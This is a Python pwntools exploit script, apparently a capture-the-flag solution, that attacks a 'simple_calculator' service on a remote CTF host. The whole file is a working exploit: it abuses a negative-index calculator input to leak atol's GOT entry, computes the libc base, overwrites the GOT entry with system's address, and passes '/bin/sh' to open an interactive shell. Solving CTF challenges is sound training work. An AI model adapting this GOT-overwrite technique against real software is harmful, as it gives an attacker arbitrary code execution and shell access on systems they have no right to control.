from pwn import *

# r = process("./simple_calculator")
r =remote('ctf.adl.tw', 11005)
#r = gdb.debug("./simple_calculator", "b main")
libc = ELF("./libc.so.6")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r.recv()
leak_str = '+ + -15'    #leak atol's GOT
r.sendline(leak_str)
r.recvuntil(': ')
atol_address = int(r.recvline())

print atol_address
libc_base = atol_address - libc.symbols['atol']
system_address = libc_base + libc.symbols['system']

payload = '+ + -16 ' + str(system_address) + ' /bin/sh\x00' #change atol's GOT to system and put /bin/sh as parameter
r.recv()
r.sendline(payload)

r.interactive()
